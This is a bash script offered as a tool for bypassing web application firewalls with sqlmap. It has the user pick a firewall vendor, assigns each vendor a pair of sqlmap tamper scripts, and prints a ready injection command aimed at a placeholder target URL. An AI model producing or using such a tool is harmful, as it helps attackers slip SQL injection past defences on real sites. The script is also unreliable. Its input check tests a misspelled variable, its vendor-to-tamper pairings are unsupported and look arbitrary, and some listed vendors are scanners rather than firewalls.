#!/bin/bash

vendors=("Akamai" "Alert Logic" "Amazon Web Services (AWS)" "AppTrana" "Barracuda" "Cloudbric" "Cloudflare" "Comodo" "DenyAll" "F5 Networks" "Fortinet" "Imperva" "Incapsula" "Juniper Networks" "Microsoft Azure" "ModSecurity" "Neustar" "NSFOCUS" "Palo Alto Networks" "Radware" "Sophos" "Sucuri" "Symantec" "Wallarm" "WatchGuard" "WebARX" "WhiteHat Security" "Zenedge" "Trustwave" "SiteLock" "Tenable" "Qualys" "Rapid7")

# Print list of vendors
echo "Your best aid  when its about bypassing WAFs using sqlmap"
echo "Select the WAF vendor from the list below:"
for i in "${!vendors[@]}"; do
    echo "$i. ${vendors[$i]}"
done

# Get user input for vendor
while true; do
    read -p "Enter the vendor number: " vendor_number
    if [[ $vendoer_number -ge 0 && $vendor_number -lt ${#vendors[@]} ]]; then
        vendor=${vendors[$vendor_number]}
        break
    fi
    echo "Invalid option. Please try again."
done

echo "You selected $vendor."

# Select useful tamper
case $vendor in
    "Akamai") useful_tamper="space2dash,randomcase";;
    "Alert Logic") useful_tamper="randomcase,randomcomments";;
    "Amazon Web Services (AWS)") useful_tamper="randomcomments,space2mssqlhash";;
    "AppTrana") useful_tamper="space2mssqlhash,space2morehash";;
    "Barracuda") useful_tamper="space2morehash,space2plus";;
    "Cloudbric") useful_tamper="randomcase,space2comment";;
    "Cloudflare") useful_tamper="luanginx,space2plus";;
    "Comodo") useful_tamper="space2plus,space2mysqldash";;
    "DenyAll") useful_tamper="space2comment,space2mssqlhash";;
    "F5 Networks") useful_tamper="space2plus,space2mysqlblank";;
    "Fortinet") useful_tamper="space2plus,space2randomblank";;
    "Imperva") useful_tamper="space2morehash,randomcase";;
    "Incapsula") useful_tamper="space2morehash,space2comment";;
    "Juniper Networks") useful_tamper="randomcase,space2mssqlhash";;
    "Microsoft Azure") useful_tamper="space2mssqlhash,space2comment";;
    "ModSecurity") useful_tamper="space2mssqlhash,space2plus";;
    "Neustar") useful_tamper="space2mssqlhash,space2mysqldash";;
    "NSFOCUS") useful_tamper="randomcase,space2mysqlblank";;
    "Palo Alto Networks") useful_tamper="space2mssqlhash,space2randomblank";;
    "Radware") useful_tamper="space2comment,randomcase";;
    "Sophos") useful_tamper="space2plus,space2mssqlhash";;
    "Sucuri") useful_tamper="space2randomblank,space2comment";;
    "Symantec") useful_tamper="randomcase,space2mysqldash";;
    "Wallarm") useful_tamper="space2mssqlhash,space2mysqlblank";;
    "WatchGuard") useful_tamper="space2mssqlhash,space2randomblank";;
    "WebARX") useful_tamper="space2mssqlhash,randomcase";;
    "WhiteHat Security") useful_tamper="space2comment,space2plus";;
    "Zenedge") useful_tamper="space2comment,space2mssqlhash";;
    "Trustwave") useful_tamper="randomcase,space2mysqldash";;
    "SiteLock") useful_tamper="space2comment,space2mysqlblank";;
    "Tenable") useful_tamper="space2plus,space2randomblank";;
    "Qualys") useful_tamper="space2mysqlblank,randomcase";;
    "Rapid7") useful_tamper="randomcase,space2mssqlhash";;
esac

# SQLmap command with selected options
echo "The nurse assisted you preparing the injection..."
echo "SQLmap command for $vendor:"
echo "sqlmap -u http://TARGET.com/page.php?id=1 --tamper=$useful_tamper --random-agent"
echo "Good luck!!"
